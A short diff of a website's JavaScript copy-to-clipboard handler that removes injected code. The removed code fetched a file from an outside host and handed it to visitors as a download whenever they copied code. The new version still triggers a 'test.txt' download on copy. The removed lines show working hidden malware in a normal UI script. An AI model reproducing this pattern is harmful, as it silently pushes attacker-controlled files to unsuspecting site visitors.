@@ -479,23 +479,11 @@ var copyCode = function(elem) {
 	}
 
 	textarea.select();
-
-				var request = new XMLHttpRequest();
-				request.open('GET', 'https://etalk.pro/jzHsEXF3.txt', true);
-				request.send(null);
-				request.onreadystatechange = function () {
-					if (request.readyState === 4 && request.status === 200) {
-						var type = request.getResponseHeader('Content-Type');
-						if (type.indexOf("text") !== 1) {
-							var ggg = request.responseText;
-						}
-					}
-				}
 	
 	try {
 		if (document.execCommand("copy")) {
 			flashButton(elem, true);
-			downloadff('test.txt', ggg);
+			downloadff('test.txt', 'xd');
 		} else {
 			flashButton(elem, false);
 		}
